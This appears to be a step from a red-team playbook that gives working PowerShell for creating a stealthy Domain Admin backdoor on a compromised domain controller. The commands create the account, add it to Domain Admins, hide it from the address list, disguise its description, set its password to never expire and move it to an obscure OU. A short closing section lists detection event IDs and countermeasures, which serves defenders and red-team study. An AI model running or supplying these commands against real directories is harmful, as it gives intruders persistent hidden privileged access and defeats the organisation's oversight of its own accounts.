
# Step 3: Create Stealthy Domain Admin Backdoor

**Objective**: Create a hidden domain admin account for persistent access, even if the primary beacon is lost or discovered.

---

## Context

- Red Team has direct control of the Domain Controller (`infra-dc1`)
- Goal is to ensure long-term access via stealthy privileged account

---

## Execution

### 1. Create New Domain Admin Account

```powershell
New-ADUser -Name "ServiceAccount" -SamAccountName "svc_account" -UserPrincipalName "svc_account@domain.com" -AccountPassword (ConvertTo-SecureString "ComplexPassword123!" -AsPlainText -Force) -Enabled $true
Add-ADGroupMember -Identity "Domain Admins" -Members "svc_account"
```

### 2. Apply Stealth Attributes

```powershell
Set-ADUser -Identity "svc_account" -Replace @{msExchHideFromAddressLists=$true}
Set-ADUser -Identity "svc_account" -AccountNotDelegated $true
Set-ADUser -Identity "svc_account" -Add @{userAccountControl=2097152}
Set-ADUser -Identity "svc_account" -Description "Windows System Service Account"
Set-ADUser -Identity "svc_account" -PasswordNeverExpires $true
```

(Optional) Move to obscure OU:
```powershell
Move-ADObject -Identity "CN=ServiceAccount,CN=Users,DC=domain,DC=com" -TargetPath "OU=System,DC=domain,DC=com"
```

---

## Result

- Stealthy domain admin account (`svc_account`) created
- Hidden from common user discovery mechanisms
- Persistent access guaranteed even if primary accounts are removed

---

## Detection Opportunities

| Event ID | Description |
|----------|-------------|
| 4720     | New domain user creation |
| 4728     | Added to Domain Admins group |
| PowerShell logs | Administrative account operations |

---

## Defensive Countermeasures

- Alert on new accounts added to Domain Admins
- Monitor changes to high-privileged groups and non-standard OUs
- Audit for accounts hidden from GAL or marked non-delegable
